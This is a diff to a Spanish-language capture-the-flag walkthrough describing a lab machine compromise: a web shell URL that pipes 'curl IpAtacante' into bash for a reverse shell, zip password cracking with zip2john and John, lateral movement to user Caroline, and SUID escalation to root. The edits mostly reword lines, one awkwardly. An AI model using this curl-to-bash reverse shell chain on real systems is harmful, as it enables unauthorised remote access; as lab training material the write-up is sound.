@@ -30,9 +30,9 @@ Sabiendo todo esto, el atacante accederá al directorio **secret** dentro de la 
 
 De esta forma el atacante, se creará un **index.html** con codigo para ejecutarse una **reverse shell** en **bash**, se creará un servicio **HTTP** y se pondra en escucha por el **puerto 443**, dentro de la url hará que la maquina realice un **curl** a la IP del atacante y "pipeara" el resultado con **bash** **(http://IpMaquina/cmd.php?cmd=curl IpAtacante | bash)**, realizando esto obtendremos una **reverse shell** y obtendremos acceso a la maquina como **www-data** en donde realizaremos un tratamiento de la **TTY**.
 
-Una vez ya tenemos acceso como **www-data** dentro de la maquina, encontraremos un fichero llamado **backupPasswords.zip** en **/var/www/**, cifrado con una contraseña, la cual podremos crackear con **zip2john** para obtener el **hash** y despues crackear el **hash** con la herramienta de **John**.
+Una vez ya tenemos acceso como **www-data** dentro de la maquina, encontraremos una imagen del persone **Caroline**. dicha imagen tendrá un zip llamado **backupPasswords.zip** en **/var/www/**, cifrado con una contraseña, la cual podremos crackear con **zip2john** para obtener el **hash** y despues crackear el **hash** con la herramienta de **John**.
 
-Cuando hagamos el unzip del fichero, el atacante verá otro fichero con muchas contraseñas, y utilizará estas contraseñas para acceder con otro usuario del sistema llamado **Caroline**, de esta forma podrá **pivotar** a este usuario.
+Cuando hagamos el unzip del fichero, el atacante verá otro fichero con muchas contraseñas, y utilizará estas contraseñas para acceder con otro usuario del sistema llamado **Caroline**, de esta forma podrá **moverse lateralmente** a este usuario.
 
 Con el usuario **Caroline**, podremos visualizar la flag **user.txt** en el directorio **/home/caroline/**, además el atacante verá que tiene permisos de SUID sobre un fichero en especifico, el cual este permiso le permitirá escalar sus privilegios al usuario de root.
 
